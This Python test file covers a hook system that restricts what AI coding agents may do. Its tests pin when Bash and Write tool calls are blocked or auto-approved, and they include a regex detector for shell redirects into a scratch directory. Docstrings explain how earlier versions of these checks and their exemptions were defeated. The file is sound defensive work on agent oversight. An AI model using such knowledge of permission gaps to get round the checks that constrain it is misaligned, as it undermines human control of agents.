                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend", "codex", "--event", "PreToolUse",
                            "--input-json", json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))

    def test_codex_bootstrap_child_binding_blocks_pure_shell_before_thread_index(self) -> None:
        """The inherited child id closes the thread.started-to-hook race."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_bootstrap_shell_001"
            run_id = "substep_run_bootstrap_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "capabilities").mkdir(parents=True, exist_ok=True)
            (orch_root / "active_children").mkdir(parents=True, exist_ok=True)
            (orch_root / "capabilities" / f"{run_id}.json").write_text(
                json.dumps({"mode": "pure_readonly", "write_roots": []}), encoding="utf-8"
            )
            (orch_root / "active_children" / f"{run_id}.txt").write_text(run_id, encoding="utf-8")
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "session_id": "thread-not-yet-indexed",
                "tool_input": {"command": "cat workspace/pipelines/prior/source_meta.json"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {
                    "METFORGE_WORKFLOW_MODE": "1",
                    "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0",
                    "METFORGE_CHILD_AGENT_RUN_ID": run_id,
                },
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        ["--backend", "codex", "--event", "PreToolUse",
                         "--input-json", json.dumps(payload)]
                    )
            self.assertEqual(code, 2)
            self.assertIn("may not invoke Bash or Shell", json.loads(out.getvalue())["reason"])


class GetAgentRoleFromCapabilityTests(unittest.TestCase):
    """`_get_agent_role_from_capability` resolution including orchestration fallback."""

    def test_returns_role_from_capability_file(self) -> None:
        from tools.hooks.cli import _get_agent_role_from_capability
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            cap_dir = repo / "workspace" / "orchestrations" / "orch_x" / "capabilities"
            cap_dir.mkdir(parents=True)
            (cap_dir / "run_step.json").write_text(
                json.dumps({"agent_role": "step"}), encoding="utf-8"
            )
            self.assertEqual(
                _get_agent_role_from_capability(repo, "orch_x", "run_step"),
                "step",
            )

    def test_falls_back_to_orchestration_meta_for_orchestration_agent(self) -> None:
        """Regression: orchestration agent has no capability file. Role must
        be resolved from orchestration_meta.json so auto-read tolerance and
        the auto_read_expected_block classification work via the CLI path."""
        from tools.hooks.cli import _get_agent_role_from_capability
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            orch_root = repo / "workspace" / "orchestrations" / "orch_x"
            orch_root.mkdir(parents=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({
                    "orchestration_agent_run_id": "run_orch_001",
                    "orchestration_id": "orch_x",
                }),
                encoding="utf-8",
            )
            self.assertEqual(
                _get_agent_role_from_capability(repo, "orch_x", "run_orch_001"),
                "orchestration",
            )

    def test_returns_none_for_unknown_agent(self) -> None:
        from tools.hooks.cli import _get_agent_role_from_capability
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            orch_root = repo / "workspace" / "orchestrations" / "orch_x"
            orch_root.mkdir(parents=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({"orchestration_agent_run_id": "run_orch_001"}),
                encoding="utf-8",
            )
            self.assertIsNone(
                _get_agent_role_from_capability(repo, "orch_x", "run_unknown")
            )


class WriteToolExtensionPolicyTests(unittest.TestCase):
    """Verify the per-extension policy of direct `Edit` / `Write` writes."""

    def _setup_orchestration_for_write(
        self,
        repo_root: Path,
        *,
        orch: str,
        run_id: str,
        allowed_output_paths: list[str],
        allowed_file_tool_paths: list[str],
        allowed_tmp_root: str | None = None,
    ) -> None:
        orch_root = repo_root / "workspace" / "orchestrations" / orch
        (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
        (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
        (orch_root / "active_child_agent_run_id.txt").write_text(run_id, encoding="utf-8")
        manifest: dict = {
            "orchestration_id": orch,
            "agent_run_id": run_id,
            "allowed_output_paths": allowed_output_paths,
            "allowed_file_tool_paths": allowed_file_tool_paths,
            "write_roots": ["workspace/ir"],
        }
        if allowed_tmp_root is not None:
            manifest["allowed_tmp_root"] = allowed_tmp_root
        (orch_root / "output_manifests" / f"{run_id}.json").write_text(
            json.dumps(manifest),
            encoding="utf-8",
        )

    def _invoke_write_hook(self, *, orch: str, repo_root: Path, file_path: str) -> tuple[int, dict]:
        payload = {
            "orchestration_id": orch,
            "repo_root": str(repo_root),
            "tool_name": "Write",
            "tool_input": {"file_path": file_path},
        }
        out = io.StringIO()
        with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
            with redirect_stdout(out):
                code = cli.main(
                    [
                        "--backend",
                        "claude",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
        body_text = out.getvalue().strip()
        body: dict = json.loads(body_text) if body_text else {}
        return code, body

    def test_write_tool_blocks_json_path_even_when_listed_in_allowed_outputs(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_ext_hooks_001"
            run_id = "step_run_ext_hooks_001"
            json_path = "workspace/ir/p/spec.ir.yaml"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[json_path],
                allowed_file_tool_paths=[],
            )
            code, body = self._invoke_write_hook(
                orch=orch, repo_root=repo_root, file_path=json_path
            )
            self.assertEqual(code, 2)
            self.assertEqual(body.get("decision"), "block")
            # A path in allowed_output_paths but NOT in allowed_file_tool_paths is not
            # Edit/Write-eligible; the recovery is to add it to allowed_file_tool_paths
            # (no longer guarded-apply-patch, which is deprecated under Phase-2).
            self.assertIn("allowed_file_tool_paths", body.get("reason", ""))

    def test_write_tool_allows_yaml_when_listed_in_allowed_file_tool_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_ext_hooks_002"
            run_id = "step_run_ext_hooks_002"
            yaml_path = "workspace/ir/p/spec.ir.yaml"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[yaml_path],
                allowed_file_tool_paths=[yaml_path],
            )
            code, body = self._invoke_write_hook(
                orch=orch, repo_root=repo_root, file_path=yaml_path
            )
            self.assertEqual(code, 0)
            self.assertTrue(body, "hook must emit hookSpecificOutput for permission auto-approve")
            self.assertEqual((body.get("hookSpecificOutput") or {}).get("permissionDecision"), "allow")

    def test_write_tool_allows_markdown_when_listed_in_allowed_file_tool_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_ext_hooks_003"
            run_id = "step_run_ext_hooks_003"
            md_path = "workspace/ir/p/notes.md"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[md_path],
                allowed_file_tool_paths=[md_path],
            )
            code, body = self._invoke_write_hook(
                orch=orch, repo_root=repo_root, file_path=md_path
            )
            self.assertEqual(code, 0)
            self.assertTrue(body, "hook must emit hookSpecificOutput for permission auto-approve")
            self.assertEqual((body.get("hookSpecificOutput") or {}).get("permissionDecision"), "allow")

    def test_write_tool_allows_source_code_when_listed_in_allowed_file_tool_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_ext_hooks_004"
            run_id = "step_run_ext_hooks_004"
            src_path = "workspace/ir/p/src/main.f90"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[src_path],
                allowed_file_tool_paths=[src_path],
            )
            code, body = self._invoke_write_hook(
                orch=orch, repo_root=repo_root, file_path=src_path
            )
            self.assertEqual(code, 0)
            self.assertTrue(body, "hook must emit hookSpecificOutput for permission auto-approve")
            self.assertEqual((body.get("hookSpecificOutput") or {}).get("permissionDecision"), "allow")

    def test_write_tool_blocks_yaml_when_not_listed_in_allowed_file_tool_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_ext_hooks_005"
            run_id = "step_run_ext_hooks_005"
            yaml_path = "workspace/ir/p/spec.ir.yaml"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[yaml_path],
                allowed_file_tool_paths=[],
            )
            code, body = self._invoke_write_hook(
                orch=orch, repo_root=repo_root, file_path=yaml_path
            )
            self.assertEqual(code, 2)
            self.assertEqual(body.get("decision"), "block")

    def test_write_tool_blocks_cli_managed_internal_paths(self) -> None:
        # `.request.input.json` / `.agent_run.input.json` are the payload files the
        # conductor hands to record-launch / finalize-child and keeps as evidence of
        # what was actually sent; a leaf editing one would rewrite that evidence.
        for suffix in ("reply.txt", "request.input.json", "agent_run.input.json"):
            with self.subTest(suffix=suffix), tempfile.TemporaryDirectory() as tmp:
                repo_root = Path(tmp)
                orch = "orch_ext_hooks_006"
                run_id = "step_run_ext_hooks_006"
                cli_managed_path = (
                    f"workspace/orchestrations/{orch}/launches/{run_id}.{suffix}"
                )
                self._setup_orchestration_for_write(
                    repo_root,
                    orch=orch,
                    run_id=run_id,
                    allowed_output_paths=[cli_managed_path],
                    allowed_file_tool_paths=[cli_managed_path],
                )
                code, body = self._invoke_write_hook(
                    orch=orch, repo_root=repo_root, file_path=cli_managed_path
                )
                self.assertEqual(code, 2)
                self.assertEqual(body.get("decision"), "block")

    def test_write_tool_auto_approves_scratch_under_allowed_tmp_root(self) -> None:
        """PIN: a Write under `allowed_tmp_root` is auto-approved for EVERY extension.

        This pins behavior that predates issue #73 (it passes on the parent commit); the
        issue only changed which route the contract instructs. It is the enforcement-side
        witness that the contract's single scratch route is admitted without an
        interactive permission decision, unlike a Bash redirect write, which matches no
        committed `permissions.allow` rule.

        The extension sweep pins that the tmp-root match precedes every extension rule in
        `validate_write_access` — it is NOT a sample of a list of allowed extensions.
        The path is deliberately absent from `allowed_file_tool_paths`, so only the
        tmp-root branch can produce the allow.
        """
        for ext in ("py", "yaml", "sh", "json", "txt"):
            with self.subTest(ext=ext), tempfile.TemporaryDirectory() as tmp:
                repo_root = Path(tmp)
                orch = "orch_tmp_scratch_001"
                run_id = "step_run_tmp_scratch_001"
                tmp_root = f"workspace/tmp/{run_id}"
                scratch_path = f"{tmp_root}/work.{ext}"
                self._setup_orchestration_for_write(
                    repo_root,
                    orch=orch,
                    run_id=run_id,
                    allowed_output_paths=["workspace/ir/p/spec.ir.yaml"],
                    allowed_file_tool_paths=["workspace/ir/p/spec.ir.yaml"],
                    allowed_tmp_root=tmp_root,
                )
                code, body = self._invoke_write_hook(
                    orch=orch, repo_root=repo_root, file_path=scratch_path
                )
                self.assertEqual(code, 0)
                self.assertEqual(
                    (body.get("hookSpecificOutput") or {}).get("permissionDecision"),
                    "allow",
                    f"Write to {scratch_path} must be auto-approved, not merely allowed",
                )

    # (surface, anchor for the sentence that states the scratch rule, scope).
    # scope "row" reads the last cell of the anchored table row (the remedy column);
    # scope "sentence" reads _STATEMENT_WINDOW characters from the anchor. Neither
    # reads the whole line: these surfaces state the ARTIFACT write rule on the same
    # line, and it names the same tool, so a line-wide match proves nothing.
    _SCRATCH_SURFACES = (
        ("docs/AGENT_CONTRACT.md", "When a temporary file is needed", "sentence"),
        ("docs/workflow/LAUNCH_PROMPT_REFERENCE.md", "Every extension alike", "sentence"),
        ("docs/RUNBOOK.md", "| `output_manifest_write_guard` |", "row"),
        ("docs/WORKSPACE_LAYOUT.md", "the place for", "sentence"),
        ("tools/prompt_templates/step_agent.txt", "For a temporary file", "sentence"),
        ("tools/prompt_templates/substep_agent.txt", "For a temporary file", "sentence"),
        # Operator-facing, but it states the same output_manifest_write_guard
        # remedy as docs/RUNBOOK.md; it drifted into a fourth wording once.
        ("skills/workflow-audit-claude/SKILL.md", "| output_manifest_write_guard |", "row"),
    )

    # Files scanned for a redirect into the tmp root. The scratch surfaces, plus
    # docs/CLI_REFERENCE.md — it taught the gate-stderr capture but states no scratch
    # rule, so it is not a _SCRATCH_SURFACES member and the other check must not read
    # it. One owner for the shared part: the file list is derived, not respelled.
    _REDIRECT_SURFACES = tuple(
        dict.fromkeys(
            [rel for rel, _anchor, _scope in _SCRATCH_SURFACES] + ["docs/CLI_REFERENCE.md"]
        )
    )

    # Long enough for every surface's own statement (measured longest: 132 chars from
    # anchor to the start of the tool name; 144 to its end, which is the true lower
    # bound), short enough to exclude the artifact-write sentence that follows it on
    # the same line (nearest: 699 chars from the anchor, in both templates).
    _STATEMENT_WINDOW = 200

    # `tee PATH` writes PATH with no redirect operator, so it needs its own
    # pattern; it is judged by the same rule (no allow entry names `tee`, so a
    # `| tee workspace/tmp/...` capture is refused as surely as `cat >` is).
    _REDIRECT = re.compile(
        r"\d?>>?\|?\s*[\"\']?(?:\./)?(workspace/tmp\S*)"
        r"|(?<=tee )(?:-\S+ )*[\"\']?(?:\./)?(workspace/tmp\S*)"
    )

    # Satisfied by naming the file tool, or by deferring to the canonical document
    # instead of restating the rule (this repository treats a restated rule as a
    # twin document, so a pointer must remain a legal answer). Tolerates the
    # emphasis spellings a normal doc edit produces: **Write** tool, `Write`-tool.
    _NAMES_THE_ROUTE = re.compile(r"[`*]*Write[`*]*[-\s]+tool|AGENT_CONTRACT\.md")

    # A `Bash(...)` / `Read(...)` span is a permission-RULE spelling, not a command
    # anyone is being taught to run. Without this, the repository could not quote
    # the candidate allow entry that issue #77 exists to evaluate.
    _PERMISSION_ENTRY = re.compile(
        r"^[\"']?(?:Bash|Read|Write|Edit|WebFetch)\(.*\)[\"']?,?$"
    )

    @classmethod
    def _redirect_offenders(cls, text: str, rel: str = "<fixture>") -> list[str]:
        """The rule, in one place, called by the surfaces check and by its self-test.

        A negative assertion is green when its detector is broken, and the detector
        is five parts, not one: the span scanner, the two marker vocabularies, the
        permission-entry exemption, and the redirect pattern. Reimplementing any of
        them in the self-test would leave the real one unobserved, so both callers
        run THIS function.
        """
        offenders: list[str] = []
        for n, span in cls._command_spans(text):
            if cls._PERMISSION_ENTRY.match(span.strip()):
                continue
            # The command in front of the redirect is not consulted: no command
            # makes a redirect to a file a permitted route.
            if cls._REDIRECT.search(span):
                offenders.append(f"{rel}:{n}: {span.strip()}")
        return offenders

    @staticmethod
    def _command_spans(text: str) -> list[tuple[int, str]]:
        """(line number, command text) for every backticked or fenced span.

        No introducing prose is captured, because the check no longer exempts a
        span for being shown as an NG example. That exemption asked whether a
        span was being TAUGHT or REFUSED — a question about meaning, decided from
        nearby words — and it was broken three review rounds running, each time in
        a new form: a fixed window too short for this repository's NG headers, then
        a wider window that exempted 88 unrelated fenced lines, then a vocabulary
        that fires on ANY refusal verb regardless of its subject, so a header
        reading "a direct Read of the gate file is blocked, so capture the stderr:"
        exempted the very instruction this branch removed. Narrowing the sample a
        fourth time would have been the fourth version of one mistake.

        The question is weaker now and answerable: does a scanned surface spell a
        redirect into the tmp root at all? An NG example must therefore name the
        shape without spelling a target under `workspace/tmp/` — the one live
        example was reworded that way, and the cost is stated in the check below.
        """
        spans: list[tuple[int, str]] = []
        lines = text.splitlines()
        fenced = False
        for n, line in enumerate(lines, start=1):
            if line.lstrip().startswith(("```", "~~~")):
                fenced = not fenced
                continue
            if fenced:
                spans.append((n, line))
                continue
            for m in re.finditer(r"`([^`]+)`", line):
                spans.append((n, m.group(1)))
        return spans

    def test_tmpdir_env_form_is_not_a_write_path(self) -> None:
        """PIN: `${TMPDIR}/x` is not the scratch route; only the literal path is.

        docs/workflow/LAUNCH_PROMPT_REFERENCE.md states this as a measured mechanism
        claim, and the branch's other mechanism claims went unpinned. The guard
        compares the path it is handed against allowed_tmp_root verbatim; the Write
        tool takes a path, not a shell word, so nothing expands the variable.
        """
        for spelling in ("${TMPDIR}/work.py", "$TMPDIR/work.py"):
            with self.subTest(spelling=spelling), tempfile.TemporaryDirectory() as tmp:
                repo_root = Path(tmp)
                orch = "orch_tmpdir_env_001"
                run_id = "step_run_tmpdir_env_001"
                self._setup_orchestration_for_write(
                    repo_root,
                    orch=orch,
                    run_id=run_id,
                    allowed_output_paths=["workspace/ir/p/spec.ir.yaml"],
                    allowed_file_tool_paths=["workspace/ir/p/spec.ir.yaml"],
                    allowed_tmp_root=f"workspace/tmp/{run_id}",
                )
                code, body = self._invoke_write_hook(
                    orch=orch, repo_root=repo_root, file_path=spelling
                )
                self.assertEqual(code, 2, f"{spelling} must not be write-eligible")
                self.assertEqual(body.get("decision"), "block")

    def test_instruction_surfaces_teach_no_redirect_into_the_tmp_root(
        self,
    ) -> None:
        """SAMPLE (not a pin): no instruction surface shows a redirect into the tmp
        root, in any position.

        The rule, not a spelling: the permission layer refuses a Bash redirect to a
        file, so there is no position in which one is a route a leaf can take. An
        earlier version of this check admitted a redirect APPENDED to a command the
        committed allowlist covers, on the premise that it rides that entry. That
        premise was measured false on Claude Code 2.1.234 — both taught captures
        (`... 2>workspace/tmp/<arid>/e.txt` on the allowlisted run-gate command, and a
        stdout capture on the allowlisted `python3 workspace/tmp/*` route) answer
        `Output redirection to '<path>' was blocked`, while the same commands without
        the redirect run. The admission is therefore gone rather than narrowed, and
        the check is strictly stricter than the version it replaces; `docs/HOOKS.md`
        §"Layer boundary" carries the measurement.

        SCOPE, stated because three versions of this check were each defeated in a
        new form. It answers ONE question: does a documented command carry a redirect
        into the tmp root that the permission layer would refuse? It does NOT answer
        "does this document teach shell-authored scratch files", which is not decidable
        from text. `python3 gen.py > docs/out.txt` names a path outside the tmp root
        and is admitted here for that reason — not because the redirect is permitted,
        which it is not in any position (docs/HOOKS.md §"Layer boundary"); which
        layer refuses a write is a different question from which rule this check
        enforces. That
        second question has no static instrument in this branch; it is what review of
        a documentation change is for.

        Further declared limits, each measured: it reads an enumerated file list; it
        only sees commands inside backticks or a fenced block (``` or ~~~), so a
        route taught in bare prose or a 4-space-indented block is invisible; a span
        split across two backtick runs is invisible; and it sees only targets under
        `workspace/tmp`, which is the route these documents taught — an in-repo
        target elsewhere (`> workspace/ir/x/ir_meta.json`) is refused by the same
        layer and is NOT scanned here, because the write-side hook is what governs
        that class and the surfaces state it separately.

        There is NO exemption for a span shown as an NG example: writing one means
        naming the shape without spelling a target under the tmp root ("a `2>`
        redirect whose target is under `workspace/tmp/<agent_run_id>/`"). That cost
        is deliberate — the exemption it replaces was broken in three review rounds,
        finally by a marker whose subject was a different rule entirely.
        """
        repo_root = Path(__file__).resolve().parents[2]
        # The scanned set is asserted against a LITERAL list, not against the
        # expression it is derived from: comparing the derived tuple with its own
        # derivation holds by construction, so emptying `_SCRATCH_SURFACES` left
        # both this check and the scratch-route check scanning nothing, green.
        self.assertEqual(
            set(self._REDIRECT_SURFACES),
            {
                "docs/AGENT_CONTRACT.md",
                "docs/CLI_REFERENCE.md",
                "docs/RUNBOOK.md",
                "docs/WORKSPACE_LAYOUT.md",
                "docs/workflow/LAUNCH_PROMPT_REFERENCE.md",
                "tools/prompt_templates/step_agent.txt",
                "tools/prompt_templates/substep_agent.txt",
                "skills/workflow-audit-claude/SKILL.md",
            },
        )
        for rel in self._REDIRECT_SURFACES:
            with self.subTest(surface=rel):
                path = repo_root / rel
                self.assertTrue(path.is_file(), f"{rel} missing; update the surface list")
                offenders = self._redirect_offenders(
                    path.read_text(encoding="utf-8"), rel
                )
                self.assertEqual(offenders, [], "\n".join(offenders))

    def test_redirect_detector_sees_every_taught_shape_and_not_the_exempt_ones(
        self,
    ) -> None:
        """SELF-TEST for the check above, which is a negative assertion.

        A negative assertion is green when its detector is broken, and this detector
        has five parts: the span scanner, the two marker vocabularies, the
        permission-entry exemption, and the redirect pattern. Measured: emptying
        `_command_spans`, blanking either marker regex, or replacing the offender
        accumulation with `pass` all left the surfaces check green while it read the
        real tree. So the fixtures below drive `_redirect_offenders` — the same
        function the surfaces check calls — instead of reimplementing the loop.

        The two former "admitted" cases are here as DETECTED shapes: after the
        measurement, an appended capture is refused exactly as a standalone redirect
        is. `/dev/null` and a path outside the tmp root must NOT be seen — the first
        discards rather than writes, the second is a different rule's subject.
        """
        detected = (
            "cat > workspace/tmp/a/x.py <<'EOF'",
            "printf 'x' > workspace/tmp/a/x.py",
            "tee workspace/tmp/a/x.py",
            "python3 tools/new_agent_run_id.py > workspace/tmp/a/id.txt",
            "python3 tools/orchestration_runtime.py run-gate --gate g 2>workspace/tmp/a/e.txt",
            "cat workspace/tmp/a/in.txt 2>workspace/tmp/a/err.txt",
            "python3 workspace/tmp/a/x.py > workspace/tmp/a/out.txt",
            "python3 tools/orchestration_runtime.py run-gate --gate g >>workspace/tmp/a/e.txt",
        )
        not_detected = (
            "python3 tools/orchestration_runtime.py run-gate --gate g 2>/dev/null",
            "python3 workspace/tmp/a/x.py",
            "python3 gen.py > docs/out.txt",
        )
        for command in detected:
            with self.subTest(command=command, expect="detected"):
                self.assertIsNotNone(
                    self._REDIRECT.search(command),
                    "the detector saw no redirect into the tmp root",
                )
        for command in not_detected:
            with self.subTest(command=command, expect="not detected"):
                self.assertIsNone(self._REDIRECT.search(command))

    def test_redirect_offender_rule_flags_and_admits_on_fixtures(self) -> None:
        """SELF-TEST of the whole rule, on fixture documents rather than the tree.

        Each case names the part it observes. Without these, four ways of making the
        surfaces check vacuous were green: `_command_spans` returning `[]`, either
        marker regex reduced to `r""`, and the offender append replaced by `pass`.

        The admitted cases are equally load-bearing: they are the over-refusal
        probes. `refuses` / `blocks` / `rejects` are the verbs these surfaces write,
        a permission entry is a rule spelling rather than a command, and a fenced NG
        block carries its marker in a comment header several lines up.
        """
        flagged = {
            "bare prose": "Capture it with `2>workspace/tmp/<agent_run_id>/e.txt` for later.",
            "appended to a permitted command": (
                "Run `python3 tools/orchestration_runtime.py run-gate --gate g "
                "2>workspace/tmp/<agent_run_id>/e.txt` to keep the result."
            ),
            "tee": "Keep a copy with `run-gate --gate g | tee workspace/tmp/a/e.txt`.",
            "fenced": "```bash\nrun-gate --gate g 2>workspace/tmp/a/e.txt\n```",
            # Every one of these was ADMITTED while the check exempted a span
            # introduced by a refusal marker. Each is a real sentence from a real
            # review round, and each was a way to re-teach the route with the suite
            # green: the verb tense, the distance to the marker, and — the one no
            # narrowing could reach — a marker whose SUBJECT is something else.
            "prose marker before the span": "The layer refuses `2>workspace/tmp/a/e.txt`.",
            "marker about a different subject": (
                "A direct Read is blocked, so capture stderr with "
                "`2>workspace/tmp/a/e.txt`."
            ),
            "fenced, marker about a different subject": (
                "```bash\n# a direct Read of the gate file is blocked, so capture the stderr:\n"
                "run-gate --gate g 2>workspace/tmp/a/e.txt\n```"
            ),
            "fenced NG header": (
                "```bash\n# NG: the permission layer refuses this shape.\n"
                "run-gate --gate g 2>workspace/tmp/a/e.txt\n```"
            ),
        }
        for label, text in flagged.items():
            with self.subTest(case=label, expect="flagged"):
                self.assertEqual(
                    len(self._redirect_offenders(text)), 1, f"{label}: not flagged"
                )
        admitted = {
            # The two structural exemptions that remain. Neither asks what a
            # sentence MEANS: a permission entry is a rule spelling rather than a
            # command, and the other two name no target under the tmp root.
            "permission entry": "Add `Bash(python3 tools/orchestration_runtime.py * 2>workspace/tmp/*)`.",
            "permission entry, JSON spelling": (
                'Add `"Bash(python3 tools/orchestration_runtime.py * 2>workspace/tmp/*)",` '
                "to the allow list."
            ),
            "devnull": "Discard it with `run-gate --gate g 2>/dev/null`.",
            "outside the tmp root": "Write it with `python3 gen.py > docs/out.txt`.",
            # How an NG example is written now: name the shape, not a target.
            "shape named without a target": (
                "A `2>` redirect whose target is under `workspace/tmp/<agent_run_id>/` "
                "is refused."
            ),
        }
        for label, text in admitted.items():
            with self.subTest(case=label, expect="admitted"):
                self.assertEqual(
                    self._redirect_offenders(text), [], f"{label}: wrongly flagged"
                )

    @staticmethod
    def _allowlisted_bash_matchers(repo_root: Path) -> list[re.Pattern[str]]:
        """The Bash commands the LEAF's settings file permits, read from the file.

        `leaf_config/claude/settings.json`, not `.claude/settings.json`: since issue
        #63's final form that is the only permission layer a leaf loads, and this
        pin followed the layer. Left pointing at the dev file, stripping all sixteen
        `Bash(...)` entries from the leaf file left the entire suite green — the very
        defect this test was written to prevent, one file over.

        A `*` is a wildcard wherever it appears, not only at the end: an earlier
        version stripped a trailing `*` and prefix-matched the rest, which made
        `Bash(jq -er * workspace/tmp/*)` unmatchable.
        """
        from tools.orchestration_runtime import CLAUDE_LEAF_CONFIG_REL
        settings = json.loads(
            (repo_root / CLAUDE_LEAF_CONFIG_REL).read_text(encoding="utf-8")
        )
        matchers = []
        for entry in settings["permissions"]["allow"]:
            if not entry.startswith("Bash(") or not entry.endswith(")"):
                continue
            pattern = entry[len("Bash(") : -1]
            if pattern.endswith(" *"):
                # A trailing ` *` also permits the command with NO argument at all:
                # measured on CLI 2.1.234, `python3 tools/validate_workspace_root.py`
                # runs under `Bash(python3 tools/validate_workspace_root.py *)`, and
                # the gate runbook emits exactly that argument-less form. Requiring
                # the separator refused a command the layer allows.
                head = "".join(
                    ".*" if part == "*" else re.escape(part)
                    for part in re.split(r"(\*)", pattern[: -len(" *")])
                )
                matchers.append(re.compile(head + r"(?:\s.*)?$"))
                continue
            body = "".join(
                ".*" if part == "*" else re.escape(part)
                for part in re.split(r"(\*)", pattern)
            )
            # An entry with no wildcard is an EXACT match, not a prefix.
            matchers.append(re.compile(body if "*" in pattern else body + r"\s*$"))
        return matchers

    # A redirect to a FILE anywhere in a segment: measured refused by the permission
    # layer regardless of the entry the rest of the segment matches
    # (docs/HOOKS.md §"Layer boundary"). `>&` is fd duplication, `/dev/null` a discard.
    _FILE_REDIRECT = re.compile(r"\d?>>?(?!&)\s*(?!/dev/null\b)[^\s;&|<>]+")

    @classmethod
    def _command_is_permitted(cls, command: str, matchers: list[re.Pattern[str]]) -> bool:
        """Model of what the permission layer admits, as far as it has been measured.

        The question is "does a committed ENTRY cover this command", not "would the
        CLI run it": the CLI additionally admits commands through its own read-only
        analysis (measured: `echo hi` and `head` run with no entry naming them), and
        that admission is deliberately not modelled — an instructed command must be
        covered by an entry, not by a classifier this repository does not control.

        Two properties beyond "some entry matches the string", both MEASURED against
        CLI 2.1.234 rather than assumed. The layer decomposes a compound and names
        the offending part (`… run-gate --gate g && curl …` →
        `The following part requires approval: curl …`), and it refuses a redirect to
        a file whatever entry the rest of the command matches. Without them this
        model certified as covered the exact command `docs/HOOKS.md` records the
        layer refusing.

        Fail-closed beyond the split: a segment carrying command substitution
        (`$(…)`, backticks) or a background `&` is not permitted, because what runs
        then is not the segment this model matched.

        Declared residue, none of which any instructed command uses, all measured on
        2.1.234 except the last: a leading `VAR=value` prefix (refused — model
        agrees), a `./tools/…` spelling (refused — agrees), a quoted path (refused —
        agrees), and repeated whitespace (`python3  tools/…` RUNS, while the model
        calls it not permitted — the one measured disagreement, in the direction
        that makes a runbook emitting it fail this test rather than pass silently).
        Splitting is byte-level, so a separator inside quotes splits too.
        """
        # `&&` and `>&` first: a bare `&` is a separator, but the `&` of an fd
        # duplication is not.
        for segment in re.split(r"\|\||&&|(?<![>&])&(?!&)|[;|]", command):
            segment = segment.strip()
            if not segment:
                continue
            if "$(" in segment or "`" in segment:
                return False
            # `<capability_token>` / `<PATH>` are documentation placeholders, not
            # shell syntax; their closing `>` read as a redirect operator and
            # rejected the runbook's own gate command.
            scanned = re.sub(r"<[^>\s]*>", " ", segment)
            if cls._FILE_REDIRECT.search(scanned):
                return False
            if not any(matcher.match(segment) for matcher in matchers):
                return False
        return True

    def test_a_private_home_tool_result_is_auto_approved_not_merely_unblocked(self) -> None:
        """The carve-out has to reach the AUTO-APPROVE path, not only the block path.

        Two layers decide this read. The common policy stopped BLOCKING it once the
        exemption learned about the private home — but auto-approval is a separate
        call, and its callers here did not pass the orchestration id, so it kept
        searching `~/.claude` only. The read then fell through to the committed leaf
        permissions, which grant no `cat /tmp/...`, and the file the harness had just
        told the agent to read stayed unavailable through Bash. Fixing the block and
        declaring victory is exactly what happened; this asserts the end state.
        """
        from tools.hooks.cli import _is_auto_approvable_readonly_bash
        with tempfile.TemporaryDirectory() as repo_td, tempfile.TemporaryDirectory() as homes:
            repo = Path(repo_td)
            home = Path(homes) / "metdsl-claude-t"
            home.mkdir()
            meta = repo / "workspace" / "orchestrations" / "o"
            meta.mkdir(parents=True)
            (meta / "orchestration_meta.json").write_text(
                json.dumps({"claude_workflow_home": str(home)}), encoding="utf-8")
            slug = str(repo.resolve()).replace("/", "-")
            results = home / "projects" / slug / "sess-1" / "tool-results"
            results.mkdir(parents=True)
            target = results / "abc.txt"
            target.write_text("oversized gate output", encoding="utf-8")

            env = {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_ORCHESTRATION_ID": "o"}
            with patch.dict(os.environ, env, clear=False):
                self.assertTrue(
                    _is_auto_approvable_readonly_bash(f"cat {target}", repo))
                # CONTROL — auto-approval bypasses the harness allowlist, so it must
                # not have become "any out-of-repo file".
                other = Path(homes) / "unrelated.txt"
                other.write_text("x", encoding="utf-8")
                self.assertFalse(
                    _is_auto_approvable_readonly_bash(f"cat {other}", repo))
            # CONTROL — without the host-set orchestration id there is no private
            # home to recognise, so the pre-issue-#63 answer stands.
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                os.environ.pop("METFORGE_ORCHESTRATION_ID", None)
                self.assertFalse(
                    _is_auto_approvable_readonly_bash(f"cat {target}", repo))

